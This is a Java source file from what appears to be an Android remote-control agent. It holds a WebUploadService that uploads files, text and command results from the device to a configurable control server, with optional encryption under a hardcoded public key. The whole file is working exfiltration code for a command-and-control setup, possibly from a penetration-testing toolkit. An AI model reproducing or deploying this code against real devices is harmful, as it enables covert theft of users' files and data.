package com.shevirah.androidagent;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import com.virgilsecurity.sdk.crypto.Crypto;
import com.virgilsecurity.sdk.crypto.PublicKey;
import com.virgilsecurity.sdk.crypto.VirgilCrypto;

import java.io.File;
import java.io.IOException;
import java.net.URLEncoder;
import static com.shevirah.androidagent.Util.fileSizeInMb;
import static com.shevirah.androidagent.Util.printExtras;
import static com.shevirah.androidagent.Util.logRequest;
public class WebUploadService extends IntentService {

    private static final String TAG = "WebUploadService";
    private static final String HTTP = "http://";
    public static final String EXTRA_STRING_TO_UPLOAD = "uploadstring";
    public static final String EXTRA_COMMAND = "command";
    public static final String EXTRA_FILE = "file";
    public static final String PARAM_TEXT = "text";
    public static final String PARAM_COMMAND = "command";
    public static final String PARAM_FILE = "file";
    private String textToUpload;
    private String command;
    private String fileName;

    public WebUploadService() {
        super(WebUploadService.class.getSimpleName());
    }

    protected void onHandleIntent(Intent intent) {
        if (intent.getExtras() == null) {
            if (Const.DEBUG) Log.e(TAG, "onHandleIntent: intent.getExtras() is null!");
            return;
        }

        if (Const.DEBUG) printExtras(TAG, intent.getExtras(), "args ");

        textToUpload = intent.getStringExtra(EXTRA_STRING_TO_UPLOAD);
        command = intent.getStringExtra(EXTRA_COMMAND);
        fileName = intent.getStringExtra(EXTRA_FILE);

        try {
            onHandle();
        } catch (Throwable e) {
            if (Const.DEBUG) Log.e(TAG, "onHandleIntent: ", e);
            if (e instanceof OutOfMemoryError) {
                System.gc();
            }
        }
    }

    private void onHandle() throws IOException {

        final String url = buildURLString();


	HttpRequest request = HttpRequest.post(url);
	String logBody = "";
        if (fileName != null) {

            if (Const.DEBUG) {
                Log.d(TAG, "file to upload " + fileName + ", size=" + fileSizeInMb(fileName));
            }

            File file = new File(fileName);
             request.form("file", file);

        } else if (textToUpload != null) {

            textToUpload = decodeUploadStringIfNeed(command, textToUpload);

            if (Boolean.valueOf(getResources().getString(R.string.use_virgil_security))){
                // Encrypt Data using appropriate keys  
                Crypto crypto = new VirgilCrypto();
                PublicKey publicKey = crypto.importPublicKey(getString(R.string.virgil_public_key2).getBytes());
                byte[] encryptedData = crypto.encrypt(textToUpload.getBytes(), publicKey);
                textToUpload = new String(encryptedData);
            }

            request.form("text", textToUpload);

        }

        // Executing POST request

 if (Const.DEBUG) logBody += "&command=" + command;
        request.form("command", command);

        if (Const.DEBUG) Log.d(TAG, "started uploading data to " + url + "\ndata=" + logBody);
        String body = request.body();
        int code = request.code();

        if (Const.DEBUG) logRequest(TAG, code, body, url, URLEncoder.encode(logBody, "utf-8"));
}           

    private String decodeUploadStringIfNeed(String command, String str) {
        if (command != null) {
            if (command.contains(CommandHandlerService.APKS) ||
                    command.contains(CommandHandlerService.UPLOAD) ||
                    command.contains(CommandHandlerService.UAPP)) {
                return HttpRequest.Base64.encode(str);
            }
        }
        return str;
    }

    private String buildURLString() {
        String url = getString(R.string.urij);
        String controlIP = getString(R.string.controlIP);
        String path = getString(R.string.controlpath);
	String myport = getString(R.string.controlport);
        StringBuilder builder = new StringBuilder(HTTP);
	if (myport.equals("80"))
	{
        builder.append(controlIP).append(path).append(url);
	}
	else
	{
	builder.append(controlIP).append(":").append(myport).append(path).append(url);
	}
        return builder.toString();
    }
}

